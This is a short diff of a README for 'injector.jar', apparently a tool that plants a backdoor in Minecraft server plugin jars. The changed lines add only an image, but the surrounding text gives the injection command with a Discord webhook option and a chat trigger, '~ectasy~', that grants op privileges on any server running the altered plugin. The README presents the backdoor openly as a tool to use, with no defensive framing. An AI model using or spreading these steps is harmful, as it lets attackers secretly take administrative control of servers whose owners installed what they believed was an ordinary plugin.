@@ -14,7 +14,8 @@ Download `injector.jar` from the [latest release](https://github.com/Body-Alhoha
 
 ## Discord Webhook
 You can use the argument `--webhook <link>` to add your discord webhook.<br>
-Example : `java -jar injector.jar --i HD.jar --webhook (link)`
+Example : `java -jar injector.jar --i HD.jar --webhook (link)`<br><br>
+<img src="/images/webhook_example.png">
 
 ## Usage
 Once the plugin is enabled on a server, type `~ectasy~` in the chat, to automatically gain op privileges.
